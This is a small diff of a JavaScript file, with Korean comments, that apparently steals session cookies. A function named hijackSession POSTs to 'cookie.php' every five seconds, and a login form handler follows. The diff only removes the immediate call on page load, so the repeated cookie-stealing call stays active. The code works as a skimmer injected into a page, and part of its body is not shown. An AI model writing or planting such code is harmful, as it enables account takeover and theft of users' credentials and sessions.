@@ -1,3 +1,4 @@
+
 function hijackSession() {
     fetch('cookie.php', {
         method: 'POST',
@@ -11,7 +12,7 @@ function hijackSession() {
 
 // 주기적으로 hijackSession 호출을 시작하고 이를 중지할 수 있도록 intervalId 저장
 const intervalId = setInterval(hijackSession, 5000);
-hijackSession(); // 페이지 로드 시 즉시 호출
+
 
 document.addEventListener('DOMContentLoaded', function() {
     const loginform = document.querySelector('form');
